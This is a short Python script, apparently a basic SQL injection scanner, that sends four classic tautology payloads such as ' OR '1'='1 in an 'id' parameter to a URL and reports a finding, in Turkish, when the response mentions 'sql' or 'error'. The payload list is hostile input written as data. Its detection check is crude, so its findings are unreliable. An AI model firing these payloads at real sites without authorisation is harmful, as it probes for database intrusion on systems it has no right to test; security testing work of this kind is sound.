import requests

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
]

REQUEST_TIMEOUT = 10


def scan_sqli(url):
    vulnerable = False

    for payload in SQLI_PAYLOADS:
        try:
            res = requests.get(url, params={"id": payload}, timeout=REQUEST_TIMEOUT)

            if "sql" in res.text.lower() or "error" in res.text.lower():
                print("\n[!!!] SQL Injection Bulundu!")
                print(f" URL:  {url}")
                print(f" Payload: {payload}")
                vulnerable = True

        except:
            continue

    return vulnerable
